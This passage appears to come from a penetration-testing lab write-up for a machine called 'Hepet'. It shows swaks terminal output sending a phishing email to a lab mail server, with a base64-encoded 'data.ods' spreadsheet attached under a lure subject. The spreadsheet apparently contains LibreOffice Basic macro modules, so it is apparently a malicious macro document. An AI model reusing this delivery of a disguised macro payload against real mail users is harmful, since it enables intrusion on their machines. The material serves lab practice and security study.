+ -&gt; DtgE7OF+Ff2oIrg/xfQvxVf9xghRAJNe26gEKh4OGZAyIRzCzNxQVBsLTK9gwoJ5Ga0xE7oisRzY
+ -&gt; J18n4IpLuEBpUlT3Dkh1UUoIDKpbDb5k8YAeHJDpTSRp74yiz31nbEBdJ8JwYUXjIEq3awOCJM5Q
+ -&gt; MUti8iWKzdyqUffkFZtjUkXAgsGn4azsdRZ31nW9WUQqCXl56Kmmi0tU/BeZEBN+oFCIEVPlGcZh
+ -&gt; 8/jDB23qgyyBzNj7Cmyy4sDALZmfoDDjX2/f4Vn8b2hcQncSQ8bhBv8CVZQIpq+Zui8VYUP1u4k0
+ -&gt; FrWL4oVicpNvHu1TEVAxeXxmmg429pJp4jyJ5ADTS2AhFX9OiGTOkLylA/SevkmMDUz+PBqh0D6U
+ -&gt; RotNiGSn9pKSVmETVxukpHX+LiJhT9u4PsQB0xR4HRDIgUmmvMR0RmEAmoyrtKBqNP+s6LFX4Qur
+ -&gt; qk3h/WQU8geuS9nfEngx81VNJ4fvzLj255QBK5T8V7mVVj8RC3d9xlRhd2KRRFQU4yN3/8jdVwbX
+ -&gt; yd0X3a3iCRrM+t3LfCBRzHqXt7QxO4JMtU8VgPkbR10mAxAOSts4FnPSuTpnhjmATwx2mQjoeJvS
+ -&gt; 4FAdvjtligVkll2MYgXa+sCtlyFfohGEHc2ZpAqKx8YeagfJR0bGyiFg5p7Qq9gbHN8M/Ips/R2U
+ -&gt; dSMz03Umi8Nk/P+QLEdUTFCJOwZF4fW839tiS7Onzxdfl3w64Y4y46+gZHas+4kMTJL5ZyeE3qWo
+ -&gt; eK9kzXlFQQH//jYOKV5cY1jiyfcrQiMLB3TakByHA86zWA3qGz0UN/Lqa2P0WQzqQmFE1pKsfoXY
+ -&gt; Iq+F8EzD0cEZl0zN12H5owRcB/53LAF99gDDaRKNJCXkDlp1BH+X3xG4kV2B2oXt/N79wPfoljps
+ -&gt; 9LrsN7rugecxyPrgIVBSvqX6pexCQp4td7OhRa3o6HYCBdXyCPXqp6bNPoOVFtL1FxeD6mVXptr/
+ -&gt; AlBLBwhByBBgogQAAHQlAABQSwMEFAAICAgAm648XAAAAAAAAAAAAAAAABcAAABCYXNpYy9TdGFu
+ -&gt; ZGFyZC9UZXN0LnhtbG1QUU/CMBh8dr/isw9ETbZuiAqDQQRmYiJCZMSY8FK7Mpp07Vw7xX9vcRBc
+ -&gt; Yp/6Xe/uu+tgtMsFfLJScyUjFHg+AiapSrnMIrRKHtwuGg2dwfl0PkneFjFoWvLChLlKK8FgsRo/
+ -&gt; PU4AuRjPCybnmw2nzFNlhvE0mUI9TxWtciYNWHeM42cEqJZ7qUmRNW962kBShzUWoa0xRYixsu7q
+ -&gt; 5N72fR/XFHSMJEnOIpQwfYIEkVlFMgsvDSnHRHOKmg2S78K+SlXmRKDhSzwDuNofgPH90jarJ8dZ
+ -&gt; Vu8wI1w6Z8stE+Ki9VEp06esNJXhwmM7Bm5VCkro1t50IbgBdwMtUijdP3QIem0vuO16nRsv6N1h
+ -&gt; SfeymnEgTsL1K5ep+tLrhOXF+i+l3njZDPC/AFxXawEuA5qnv0BzNXQ610e7WKZgyzkD3PiX4Q9Q
+ -&gt; SwcIxRrOu0gBAAAZAgAAUEsDBBQACAgIAJuuPFwAAAAAAAAAAAAAAAAcAAAAQmFzaWMvU3RhbmRh
+ -&gt; cmQvc2NyaXB0LWxiLnhtbF1Py07DQAy89yuM740DJ1Q1qURTJCREKpEeOC5Zp0Ta2NHu8vp7VpA2
+ -&gt; oidr7PE81puvwcEH+9CrFHid5QgsrdpejgUemvvlLW7KxfqqqrfNy34Hrn/1xn+vpgn7w93jwxZw
+ -&gt; SVSPLHXX9S1n6o9EVVPBH660fR9YIiR9ot0TAk7/mY0Wk/6lbEol4YQKfItxXBFpctDZ4SbPc5o4
+ -&gt; eE4mZuACn6MRa7yd956NVXFJrTMu8HwYTQif6u3oNXIb2Z4Y5QLOwdjxb4P/Lg2HiJTy00WB8gdQ
+ -&gt; SwcItYeVm9MAAABZAQAAUEsDBBQACAgIAJuuPFwAAAAAAAAAAAAAAAATAAAAQmFzaWMvc2NyaXB0
+ -&gt; LWxjLnhtbGWPQW/CMAyF7/sVnu/UZbusiII0yqRJaEWiHDhmTQoRrYPSsNJ/vwBVQXCynmy/773x
+ -&gt; 9FSV8KdsrQ3HOAxCBMW5kZq3Ma6zr8EHTicv49cknWWb5RxK/WuFbUfXqVUNy/Xn4nsGOCBKD4rT
+ -&gt; otC5CozdEiVZAledmPxYKXbgCUTzHwTsHQLpJHrGs7XPxnWn2xh3zh1GRMZTzI3yFoYhdTfYvZxK
+ -&gt; zfv+oWmaoHm/HA+jKKLL1hPhAdn27VhUKsaVEyyFlXjX+mxbiLJWSD4yPWWe/ANQSwcI+pCCbNMA
+ -&gt; AABSAQAAUEsDBBQAAAgAAJuuPFwAAAAAAAAAAAAAAAAQAAAAQ29uZmlndXJhdGlvbnMyL1BLAwQU
+ -&gt; AAgICACbrjxcAAAAAAAAAAAAAAAACgAAAHN0eWxlcy54bWzdW2lz27gZ/t5foVGmnXZmYR7yIam2
+ -&gt; PLvd3XZnkrSTZNuPOzAJUqhBggNAlp1fX5y8SdHa+KqcSSK8J97jAUDQl9f3GZndIcYxza/mwYk/
+ -&gt; n6E8ojHO06v5r19+Bsv59eYPlzRJcITWMY12GcoF4OKBID6TwjlfFwxxOQiF1rFj+ZpCjvk6hxni
+ -&gt; axGtaYFyJ7ruyqy1WTMecb4QV/OtEMXa8/b7/cl+cUJZ6n355CkaEOheeI47ZXFM+rhD3194qRdD
+ -&gt; AcEdRvt3TuJ+K7JeiWC1Wnma6lhjmg2oDjzJAdCdnAB33DxiuBBTp2+46xNPKMumSiveumwGxXZg
+ -&gt; TkvvgyTqvz68d/wmm1Ot2dzX7FFKS3NKwHC46Jx65ns1s6mW7jkBCQURzQpZGDekbXQ/anXPsECs
+ -&gt; TDTB+e1wohW1TDSD+9EpBb6neGqeRKOeRJBEpfKKtdgxopniyEMEqYlzLzgJynJWcrK8bbhYWvZb
+ -&gt; Qnd5bHrFxA/dF4hhRYJEi60bGupx0606uS4Vc11aVP4cFBYtyzSZXmJSLixtQpn68RpbeZqpnsGp
+ -&gt; thSvRLe6ozFbxNPFF3FdlhVixM8zj6GCMlEm4y6dnIq7dKAToi1kk5OimRsZVYGbnFLYsp0hAacK
+ -&gt; K966LKFHFLdFn5qGusp8l90gNjl3cjnoVHiCEXHZL/PX6wmlIOMA5xJlaLGuSRt1VrK2mJ7ON27l
+ -&gt; TKhcNRMYIRCjiPDNpfGjHJ6Z78rs1fw9lpPSEZl9hrlcYmQtONYMk4er+Z9gQflfW3xmcD5rqFb8
+ -&gt; IEW5nIdEIr7HnDc4CiwiuXjcQYZ1R3njrn2kgo47VXJMceeBC5Qd8scbiqEdN5sR53eMErgjdovi
+ -&gt; NFsPdTmDCBEyd+wFZDBlsNiCQmYVMYHlvsaQJLfUQgsQYy5grlZM/+QM51WMFOJ15bSfA5lMqCFz
+ -&gt; /FWSA78QeozAPN3BVA6hXA9EsikEky7/+nneVgtkocO8mYuKQ2l2HEa/IToTjvZ16yjWliP87WPX
+ -&gt; ogIigu5HbZY8vVZL6ha37ZakXz7qdPfkcUpydRZxVGbWfm/kR5YsF4zeKn8IlcDxbnF6fgZP5zO1
+ -&gt; LMhuJqSkXISrJEp0NvZSFaCF2eDmFKjvVoRvYUz3QJYiRwLcqxIJgmUgq6SP/lCnGzfVtkWuRyCj
+ -&gt; sUx/IWNV1ddYcarSgztBeQFVZeIYUcMKSbGFTnuxyyOx0xWovZY9h1W0y/zgHIEbhqDcK8nI4Eg0
+ -&gt; EovzGCkcVXt+zaqs6bNBAglHZaxdq/Aqf32+j/fNjiMgl2YVLm3cJkKwnXTXQD9V5oWK4h+rXhoG
+ -&gt; RYkyyQQYYjSD+SgKtfs2fETfEiTkigFuEct15Mx8uu7Y9jP+/oj+C/+9m4ajTnIITR29ms0QXIQv
+ -&gt; Ahd9Vr8NXNRhwgDyj4ZtPoAd3rCknAoaEpuVJV8ejkHT3ggoGZjQqCRzSAmOLXRkkMmiker0du97
+ -&gt; xuh+i2DMfwv934IeHtk8sToI+if+xfKiRKAGS4TU9sW1b4V6TcsNHEzkJ/ItRSEOSKUnYItwuhWu
+ -&gt; nFtE64m1IvuigLF6pgAkRmgHF6tTnDcoN1QIdeLuJRKUiAESM25UtBrsyprHHOuSHwLrHqkGWFv6
+ -&gt; N1jyn37v1ru7eNTmoQ+Kpm/ovh0Q9Xp+AFWsLyXXo70vJQf9LzmGZ9DcBVX4ZHHJHFjsuQX0oIw/
+ -&gt; bzHN7LcM5/rskUq5GKdYcGlDG+jR+WgArO2MRzDwHxJ+ZM+NCE9Hwkqo3k6Dmy3r0pbh/FaiCEiw
+ -&gt; cPgy2JvNdghP7aJtxsxjkZyyDJJqeG9R7YaSeLA8jaY6Uc/TUp3KGt1odQz9usvCGdBe0of1lyza
+ -&gt; Qqf2DmTVLit2OcW8IPABNDhmwVGZd1XzYpkPlu2I1rGml1i18bKvjSeEMhwPZfhGQxmOhbKX2Nzo
+ -&gt; TQ7lF+nH6wOaab737RUn+a4nfdDxGxjdym3WLo+bm7SoKjmY0hwScEOAYGpyOerQhCSXtMFwKHOU
+ -&gt; xWrP6J9cSGia6Y3i7N3SVz9H11R5/taf6aH9mVKRP214v2nvuHm6cLXWHywgqQ4Q3cVkkF52leWY
+ -&gt; DlEP0jtz/fG2IujLDyrzrhllB+i5IBdOe4jpZbFnEnVIGeBoWZoc0s8Cih1/q2D1d0rjo3y30z4G
+ -&gt; rqLIwNXT1cr5ue8/ArDRTrDapuqZwuBQ+6nCsFo9Lgw/wGevBBWApwxBFKlunh6C/0D9mO5Jw/Aq
+ -&gt; JvoTY5Q9f99rJ58sCIn+TDjOHTiR/b4D1feResz2+taDwfC9eKxGzp6G4cijp83EMaXq+89SqkcE
+ -&gt; auBkaQN13MHydwSqtrN9ZYFajAZq8dyBivXn6EBNm/0nxMcf771K7NHU9mnnCbf41f3ilEd/OkbD
+ -&gt; B7JDT/e0ePu89ngErV3mmNsKW5C990Ktii95NI7epWv1UuQPVN2AzPxZ6M8WvhmPr+YfAjlGQKAG
+ -&gt; t6H/VXlibl/FFmXI3sQaxf80b/o1GExceYPvPb5hqMWs2RpcsZxc4K56WzjsDYsRFb2OXAUbY+bC
+ -&gt; I8115A6bgxo5On4GS7jwF4cFu54uzldwguCiLQgXCzTF4mlbcCnFplg8awtGq1U0HlQjeN4VDIMA
+ -&gt; jQluq8cZ3USiUdGEEkL3KAaDOs7OAri80a3YLfDmYPWakm7X6u0kBUYZFDgCjnDwDigcugOKUYQz
+ -&gt; KOGYwAjxq7msidrt0Dj10XdH6lUUIDGE7kTDvQ9FFsx7mLq3os1XWwgD4qZaChQctU3asYRS9cZE
+ -&gt; c51Qc3B3zv5JuDpb2ItgCYmppNkr4uaguxxujtaumldLe7vrDXtl3XkJT911edvNpkteJxcTchj+
+ -&gt; n+Ww/qQ6ODmrHlTXNvL2nQEt5V8ETqrnnOqrnzJCNQ7ZYSnq1Etntm+joF5pzA5XtzcIrpaQQV6q
+ -&gt; KF87s4NK09ideL0feiDPuL+51K+7F/ZfvkXIcG+ur68vvfagHSlaQWhlXyWyeWTp7KBd8DDjh1hN
+ -&gt; GEtH/6Wmbb+oGRrM3wTOtdpYx1unqpGfCd5aznFvvU52DiXsk32pfiRfYSdf5htDqXoXUvn+2BSa
+ -&gt; AW/zZ/M/gQWps5rvf+nErmGxMaRbtOVFDIWbq/7tpfoBTW4MZiUTuINkp15r8MNz4AcgXM43vu/p
+ -&gt; P75vvVCMm+9mzmE5C99f6z+l033F2fTvTVSsS45XF9CvDG5Wq7qAGXv5Cvf6kcrr/1W7zf8AUEsH
+ -&gt; CJ+XJgRtCQAAqjcAAFBLAwQUAAgICACbrjxcAAAAAAAAAAAAAAAADAAAAG1hbmlmZXN0LnJkZs2T
+ -&gt; zW6DMBCE7zyFZc7YQC8FBXIoyrlqn8A1hlgFL/KaEt6+jpNWUaSq6p/U465GM9+OtJvtYRzIi7Ko
+ -&gt; wVQ0YyklykhotekrOrsuuaXbOtrYtisfmh3xaoOlnyq6d24qOV+WhS03DGzPs6IoeJrzPE+8IsHV
+ -&gt; OHFIDMa0jggJHo1CafXkfBo5zuIJZldRdOugkHn3ID2L3TqpoLIKYbZSvYe2IJGBQI0JTMqEdIMc
+ -&gt; uk5LxTOW81E5waHt4sdgvdODojxg8CuOz9jeiAym5V7gvbDuXIPffJVoeu5jenXTxfHfI5RgnDLu
+ -&gt; T+q7O3n/5/4uz/8Z4q+0dkRsQM6jZ/qQ57TyH1VHr1BLBwi092jSBQEAAIMDAABQSwMEFAAICAgA
+ -&gt; m648XAAAAAAAAAAAAAAAAAsAAABjb250ZW50LnhtbJ1XXW/jKBR9318ReaR5IzTNrLb1NKk0Wu1T
+ -&gt; uw/bjrSvBLCDBoMFOE7+/V7AdnAap9a+JAqcc+/hfkGeno+VXBy4sUKrTbZa3mULrqhmQpWb7Of7
+ -&gt; X+ghe97+9qSLQlCeM02biiuHqFYOvhfAVjavDbfwi7hgpDEq18QKmytScZs7muuaq56bf+TkwW9c
+ -&gt; p9au3SbbO1fnGLdtu2zXS21K/P4P9nvI8aPDPbo0jMlr6Pu7uzUuMSOOoIPg7Zeecdy76ipj9fj4
+ -&gt; iMPuALViwvQK//v68kb3vCJIKOuIovzMYp+zBnChTWUn8Pc4bvdgpqtJy4BA/AABHdCWGlG7uemI
+ -&gt; 6DQR3vVctsem3Iq4/USMH/ArbIaP15ceH8trrreuGBN/WuvBnSdERB+dbzj+Pp9srqejlajQUO1V
+ -&gt; DYW6k5dO25teWyMcN0OqpVC/pgvP7w6JNqS9eaTVHfaYRAm9qYQSSQfjZ2jdGBlAjGIuuT+4xavl
+ -&gt; amgvz4N268JlymEAFLpRLPZujB8/1twIv0VkoOUjC2ncrDvJ2bkO4JTtzno+JbsLz7qYX2LAux98
+ -&gt; Ekj97Rp7xAGUZnCuL4+FcZsKZWbN5tPXLOWa2t3Q+Ts2vNbGpV1+7FwN4Gs51dqPGM0KGHhQ1bqe
+ -&gt; aH17KGfn9lBOtBbdEzM7ywE8KhGfidk1Qi58V9yRuWSPTblS/49u6WKeWEhNqqbacTO7GOC++9Ay
+ -&gt; heCSzcuxRpW9TLBnR3MdM3kufMu2/dsg3iB2+B1uIySFhYcCELZP3RUzXl90q5KosiElpA1EdLay
+ -&gt; xYjiBW8yuAQhSITB4fzIzPeGQ1cfFFvaRi3hKjbLjvUG1zIjhi3fuXXLVyLU8+DlB0SSfiVV/V1q
+ -&gt; Gt8tfSR7w+5UgzsrqhraGm+f8NS58EQACngjoYJQjhin0gcgJGZYXsTf8VgvArIchCzeiIJLHJqj
+ -&gt; h1ZCnjbZV1Jr+/0CFxezxci0x6PSqxMw620rrB0hauEoXM8HYkSYWfi2tL+107dFDYg5ck4QuOoz
+ -&gt; PXgqht06aZyGR4agKNgZghs+R+qpXg3OOtGh5WHyyKZSWc9MF1EN5c+NE9wuCp3vDCe/0I7DqAOD
+ -&gt; 3nVvsYO3gvn3zt3y4eFRqKA/kTOtzUxpM7q9EAYrqaq45Rf3XJR7552v/ngA57cFN5YjXTtREYlS
+ -&gt; tjMNn6/bkeu6+8UKZhA3qIZO67r2T16QRrqLQyUHimOYCVtLcur0dNb8MwruR1RpBpakQW73USqe
+ -&gt; LIxuY6fZ6Tyr4N8HYXbPuds+Rdf+odLI0FnIcuc99qrONguhGJJkxyW82QsiLYiMGB9Yw0uwYBDM
+ -&gt; VPhz40fkNVQrJKMwluw56nEzfHbAGLU3L3DVk8OB0DkDI15XuVegoQG68MYsIMqlRCmmT89Yi6+Q
+ -&gt; KwZ91V74Bns+Ixfc8UpP8UZYGqOk3Ud5waPM4Ym/oNv/AFBLBwg1Ljg2PgQAAMMOAABQSwMEFAAI
+ -&gt; CAgAm648XAAAAAAAAAAAAAAAAAgAAABtZXRhLnhtbI1Ty47UMBC88xVR4Jr4kbeVyd44LQKJQeI2
+ -&gt; cuxOMGTskeNshr8nz5ldmAO3dLkq1dVtl0/Xc+e9gO2V0QefhNj3QAsjlW4P/rfjxyD3n6p3pWka
+ -&gt; JYBJI4YzaBecwXFvkuqetVbK7uD/cO7CEBrHMRyj0NgWUYwj1CLJHQ9eFIzv/U0xiw/+YDUzvFc9
+ -&gt; 0/wMPXOCmQvo3YLduWxpa62luFldBtstRlIg6GAW9YiEBO3ca6f0r0edkaIo0HK6U40xN+LcxZp3
+ -&gt; jxGjtb6xl+p/I2yzW0Js368GHvvVPt05a1UuiYUF7iZGME0PKoppGmAS0PxIUhYTFk26rEgLnKRJ
+ -&gt; iR4oSinYI2nB4igkcUYIpYSUaKetriCVmxYfyMEu/6q+HPNPJPq6Wfxz/FYlfosO+ir6i73BK7cF
+ -&gt; DZPY2OpZ1RY+L8ERTcI8jEP64Vnp4Xr6nqenNPZeMU4Xa36CcIgWWHLOMamnFcYZbbDIeJQXGOqU
+ -&gt; JwluZBaLVDZbD3e71f52f3s3JeidEt6CO153EAgzaDftxF9BAV23Y3jDTD23cUdRVaI320OPXkr1
+ -&gt; B1BLBwis23WlqgEAAGcDAABQSwMEFAAACAAAm648XPK7vdcTAQAAEwEAABgAAABUaHVtYm5haWxz
+ -&gt; L3RodW1ibmFpbC5wbmeJUE5HDQoaCgAAAA1JSERSAAABVQAAAc0IAwAAAJnnGDIAAAAJUExURf//
+ -&gt; /wAAAP///37vj08AAAAJcEhZcwAACxMAAAsTAQCanBgAAACwSURBVHja7cGBAAAAAMOg+VNf4AhV
+ -&gt; AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3wBn/AABQqah+QAAAABJRU5E
+ -&gt; rkJgglBLAwQUAAgICACbrjxcAAAAAAAAAAAAAAAAFQAAAE1FVEEtSU5GL21hbmlmZXN0LnhtbLVU
+ -&gt; zWoDIRC+5ykWr2W1LT0UySbQQl+g6QMYHTeCq6JjSN6+7pJNtpRAFpKb44zfz8zgcn3obLWHmIx3
+ -&gt; DXmhz6QCJ70yrm3Iz+arfifr1WLZCWc0JOTjoSrvXDqHDcnRcS+SSdyJDhJHyX0Ap7zMHTjkf+v5
+ -&gt; wHSOJgLeyAnaejiMuLHlI5D22SmBpfpEBIcA0fQpYbnX2kjgE4SBabWoLha0sVCX8ni8CNDZ2joI
+ -&gt; 3DWEXdV1aQIoI2o8BmiICMEaOQhie6fo0AM6tU5TiCBU2gEgYXOkJEAsg0i0+LlCj8Ui69OzgD+K
+ -&gt; SMm+UZRWRsU2Jf1ojiSjCVjb7YOIRnx5d/xP77RpcxxmnF7ZjYuQsuul0GyonCLMXAE8Wrj/Aox3
+ -&gt; NCp9g59S9TSbo7jGfv3vrh1Q3B10s8vd1gljE8PxSINrr5CYTrTA+nxhWbJ/3+PqF1BLBwi6egue
+ -&gt; UAEAAFkFAABQSwECFAAUAAAIAACbrjxchWw5ii4AAAAuAAAACAAAAAAAAAAAAAAAAAAAAAAAbWlt
+ -&gt; ZXR5cGVQSwECFAAUAAgICACbrjxcQcgQYKIEAAB0JQAADAAAAAAAAAAAAAAAAABUAAAAc2V0dGlu
+ -&gt; Z3MueG1sUEsBAhQAFAAICAgAm648XMUazrtIAQAAGQIAABcAAAAAAAAAAAAAAAAAMAUAAEJhc2lj
+ -&gt; L1N0YW5kYXJkL1Rlc3QueG1sUEsBAhQAFAAICAgAm648XLWHlZvTAAAAWQEAABwAAAAAAAAAAAAA
+ -&gt; AAAAvQYAAEJhc2ljL1N0YW5kYXJkL3NjcmlwdC1sYi54bWxQSwECFAAUAAgICACbrjxc+pCCbNMA
+ -&gt; AABSAQAAEwAAAAAAAAAAAAAAAADaBwAAQmFzaWMvc2NyaXB0LWxjLnhtbFBLAQIUABQAAAgAAJuu
+ -&gt; PFwAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAO4IAABDb25maWd1cmF0aW9uczIvUEsBAhQAFAAI
+ -&gt; CAgAm648XJ+XJgRtCQAAqjcAAAoAAAAAAAAAAAAAAAAAHAkAAHN0eWxlcy54bWxQSwECFAAUAAgI
+ -&gt; CACbrjxctPdo0gUBAACDAwAADAAAAAAAAAAAAAAAAADBEgAAbWFuaWZlc3QucmRmUEsBAhQAFAAI
+ -&gt; CAgAm648XDUuODY+BAAAww4AAAsAAAAAAAAAAAAAAAAAABQAAGNvbnRlbnQueG1sUEsBAhQAFAAI
+ -&gt; CAgAm648XKzbdaWqAQAAZwMAAAgAAAAAAAAAAAAAAAAAdxgAAG1ldGEueG1sUEsBAhQAFAAACAAA
+ -&gt; m648XPK7vdcTAQAAEwEAABgAAAAAAAAAAAAAAAAAVxoAAFRodW1ibmFpbHMvdGh1bWJuYWlsLnBu
+ -&gt; Z1BLAQIUABQACAgIAJuuPFy6egueUAEAAFkFAAAVAAAAAAAAAAAAAAAAAKAbAABNRVRBLUlORi9t
+ -&gt; YW5pZmVzdC54bWxQSwUGAAAAAAwADADoAgAAMx0AAAAA
+ -&gt; 
+ -&gt; ------=_MIME_BOUNDARY_000_204001--
+ -&gt; 
+ -&gt; 
+ -&gt; .
+&lt;-  250 Data received OK.
+ -&gt; QUIT
+&lt;-  221 localhost Service closing channel.
+=== Connection closed with remote host.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hepet]
+&boxur;&boxh;$ sudo swaks --to mailadmin@localhost --from jonas@localhost --body &quot;Spreadsheet Data&quot; --attach @data.ods --header &quot;Subject: Spreadshet Data For Year 2025&quot; --server 192.168.145.140                               
+=== Trying 192.168.145.140:25...
+=== Connected to 192.168.145.140.
+&lt;-  220 localhost ESMTP server ready.
+ -&gt; EHLO kali
+&lt;-  250-localhost Hello kali; ESMTPs are:
+&lt;-  250-TIME
+&lt;-  250-SIZE 0
+&lt;-  250 HELP
+ -&gt; MAIL FROM:&lt;jonas@localhost&gt;
+&lt;-  250 Sender OK - send RCPTs.
+ -&gt; RCPT TO:&lt;mailadmin@localhost&gt;
+&lt;-  250 Recipient OK - send RCPT or DATA.
+ -&gt; DATA
+&lt;-  354 OK, send data, end with CRLF.CRLF
+ -&gt; Date: Wed, 28 Jan 2026 17:15:12 -0500
+ -&gt; To: mailadmin@localhost
+ -&gt; From: jonas@localhost
+ -&gt; Subject: Spreadshet Data For Year 2025
+ -&gt; Message-Id: &lt;20260128171512.204001@kali&gt;
+ -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -&gt; MIME-Version: 1.0
+ -&gt; Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_204001&quot;
+ -&gt; 
+ -&gt; ------=_MIME_BOUNDARY_000_204001
+ -&gt; Content-Type: text/plain
+ -&gt; 
+ -&gt; Spreadsheet Data
+ -&gt; ------=_MIME_BOUNDARY_000_204001
+ -&gt; Content-Type: application/octet-stream; name=&quot;data.ods&quot;
+ -&gt; Content-Description: data.ods
+ -&gt; Content-Disposition: attachment; filename=&quot;data.ods&quot;
+ -&gt; Content-Transfer-Encoding: BASE64
+ -&gt; 
+ -&gt; UEsDBBQAAAgAAJuuPFyFbDmKLgAAAC4AAAAIAAAAbWltZXR5cGVhcHBsaWNhdGlvbi92bmQub2Fz
+ -&gt; aXMub3BlbmRvY3VtZW50LnNwcmVhZHNoZWV0UEsDBBQACAgIAJuuPFwAAAAAAAAAAAAAAAAMAAAA
+ -&gt; c2V0dGluZ3MueG1s7VrdU+I6FH+/f4XTd0Tw466MsoO4XrmrK0PR3btvoT1AxjSnk6QW9q+/Jy04
+ -&gt; iq0XC3Fm7/gETZPf+cjJ+WpOPs8isfMASnOUp15jd8/bARlgyOXk1LsdXtQ+eZ/bf5zgeMwDaIUY
+ -&gt; JBFIU9NgDE3RO7Rc6laAcsxpQaJkC5nmuiVZBLplghbGIJfLWk9ntzJi+chMcHl/6k2NiVv1epqm
+ -&gt; u+n+LqpJvXF8fFzP3i6nIuLjRIudc5ZNbu7tHdTz58fZ2dO6jC2kzBhb/H+imgOvvdTDUvz2yUKW
+ -&gt; /KfGDURWNzuLYUvs1COWWw8c0keteUXrnq+545qPBHQUsCHG3vKlmcf0kkvjtfdO6i9B3gR8BWPj
+ -&gt; Bvk7D820CLrZPPy0Mfol8Mm0kPODw+a66LWIxTUuQ5hBuEoJ0uItytaQuaj5OvxC2gtXmNRG0f57
+ -&gt; bWsNjTdxakFX+Bwy0sd/Mfp8iT8FMI01zK+bKI2qj5obsv4fRbo+qraPz5H/KTSSigbYCQx/AD8W
+ -&gt; 3AyYnMCq8qeoLHo18CXHWz40S9hBmUlviLtd57FEPUNjMNoi8E/EaEgoxVu2AegdE8kqasZoY6+q
+ -&gt; DtgE7OF+Ff2oIrg/xfQvxVf9xghRAJNe26gEKh4OGZAyIRzCzNxQVBsLTK9gwoJ5Ga0xE7oisRzY
+ -&gt; J18n4IpLuEBpUlT3Dkh1UUoIDKpbDb5k8YAeHJDpTSRp74yiz31nbEBdJ8JwYUXjIEq3awOCJM5Q
+ -&gt; MUti8iWKzdyqUffkFZtjUkXAgsGn4azsdRZ31nW9WUQqCXl56Kmmi0tU/BeZEBN+oFCIEVPlGcZh
+ -&gt; 8/jDB23qgyyBzNj7Cmyy4sDALZmfoDDjX2/f4Vn8b2hcQncSQ8bhBv8CVZQIpq+Zui8VYUP1u4k0
+ -&gt; FrWL4oVicpNvHu1TEVAxeXxmmg429pJp4jyJ5ADTS2AhFX9OiGTOkLylA/SevkmMDUz+PBqh0D6U
+ -&gt; RotNiGSn9pKSVmETVxukpHX+LiJhT9u4PsQB0xR4HRDIgUmmvMR0RmEAmoyrtKBqNP+s6LFX4Qur
+ -&gt; qk3h/WQU8geuS9nfEngx81VNJ4fvzLj255QBK5T8V7mVVj8RC3d9xlRhd2KRRFQU4yN3/8jdVwbX
+ -&gt; yd0X3a3iCRrM+t3LfCBRzHqXt7QxO4JMtU8VgPkbR10mAxAOSts4FnPSuTpnhjmATwx2mQjoeJvS
+ -&gt; 4FAdvjtligVkll2MYgXa+sCtlyFfohGEHc2ZpAqKx8YeagfJR0bGyiFg5p7Qq9gbHN8M/Ips/R2U
+ -&gt; dSMz03Umi8Nk/P+QLEdUTFCJOwZF4fW839tiS7Onzxdfl3w64Y4y46+gZHas+4kMTJL5ZyeE3qWo
+ -&gt; eK9kzXlFQQH//jYOKV5cY1jiyfcrQiMLB3TakByHA86zWA3qGz0UN/Lqa2P0WQzqQmFE1pKsfoXY
+ -&gt; Iq+F8EzD0cEZl0zN12H5owRcB/53LAF99gDDaRKNJCXkDlp1BH+X3xG4kV2B2oXt/N79wPfoljps
+ -&gt; 9LrsN7rugecxyPrgIVBSvqX6pexCQp4td7OhRa3o6HYCBdXyCPXqp6bNPoOVFtL1FxeD6mVXptr/
+ -&gt; AlBLBwhByBBgogQAAHQlAABQSwMEFAAICAgAm648XAAAAAAAAAAAAAAAABcAAABCYXNpYy9TdGFu
+ -&gt; ZGFyZC9UZXN0LnhtbG1QUU/CMBh8dr/isw9ETbZuiAqDQQRmYiJCZMSY8FK7Mpp07Vw7xX9vcRBc
+ -&gt; Yp/6Xe/uu+tgtMsFfLJScyUjFHg+AiapSrnMIrRKHtwuGg2dwfl0PkneFjFoWvLChLlKK8FgsRo/
+ -&gt; PU4AuRjPCybnmw2nzFNlhvE0mUI9TxWtciYNWHeM42cEqJZ7qUmRNW962kBShzUWoa0xRYixsu7q
+ -&gt; 5N72fR/XFHSMJEnOIpQwfYIEkVlFMgsvDSnHRHOKmg2S78K+SlXmRKDhSzwDuNofgPH90jarJ8dZ
+ -&gt; Vu8wI1w6Z8stE+Ki9VEp06esNJXhwmM7Bm5VCkro1t50IbgBdwMtUijdP3QIem0vuO16nRsv6N1h
+ -&gt; SfeymnEgTsL1K5ep+tLrhOXF+i+l3njZDPC/AFxXawEuA5qnv0BzNXQ610e7WKZgyzkD3PiX4Q9Q
+ -&gt; SwcIxRrOu0gBAAAZAgAAUEsDBBQACAgIAJuuPFwAAAAAAAAAAAAAAAAcAAAAQmFzaWMvU3RhbmRh
+ -&gt; cmQvc2NyaXB0LWxiLnhtbF1Py07DQAy89yuM740DJ1Q1qURTJCREKpEeOC5Zp0Ta2NHu8vp7VpA2
+ -&gt; oidr7PE81puvwcEH+9CrFHid5QgsrdpejgUemvvlLW7KxfqqqrfNy34Hrn/1xn+vpgn7w93jwxZw
+ -&gt; SVSPLHXX9S1n6o9EVVPBH660fR9YIiR9ot0TAk7/mY0Wk/6lbEol4YQKfItxXBFpctDZ4SbPc5o4
+ -&gt; eE4mZuACn6MRa7yd956NVXFJrTMu8HwYTQif6u3oNXIb2Z4Y5QLOwdjxb4P/Lg2HiJTy00WB8gdQ
+ -&gt; SwcItYeVm9MAAABZAQAAUEsDBBQACAgIAJuuPFwAAAAAAAAAAAAAAAATAAAAQmFzaWMvc2NyaXB0
+ -&gt; LWxjLnhtbGWPQW/CMAyF7/sVnu/UZbusiII0yqRJaEWiHDhmTQoRrYPSsNJ/vwBVQXCynmy/773x
+ -&gt; 9FSV8KdsrQ3HOAxCBMW5kZq3Ma6zr8EHTicv49cknWWb5RxK/WuFbUfXqVUNy/Xn4nsGOCBKD4rT
